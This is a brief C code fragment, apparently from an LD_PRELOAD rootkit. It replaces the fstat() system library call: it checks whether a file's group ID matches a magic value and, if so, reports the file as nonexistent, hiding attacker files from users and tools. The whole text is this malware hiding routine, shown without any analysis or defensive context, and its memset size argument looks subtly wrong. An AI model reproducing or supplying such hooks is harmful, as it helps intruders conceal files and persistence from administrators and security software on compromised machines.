int fstat(int fd, struct stat *buf)
{
       struct stat s_fstat;

       #ifdef DEBUG
       printf("fstat hooked.\n");
       #endif

       memset(&s_fstat, 0, sizeof(stat));

       old_fxstat(_STAT_VER, fd, &s_fstat);

       if(s_fstat.st_gid == MAGIC_GID) {
               errno = ENOENT;
               return -1;
       }

       return old_fxstat(_STAT_VER, fd, buf);
}

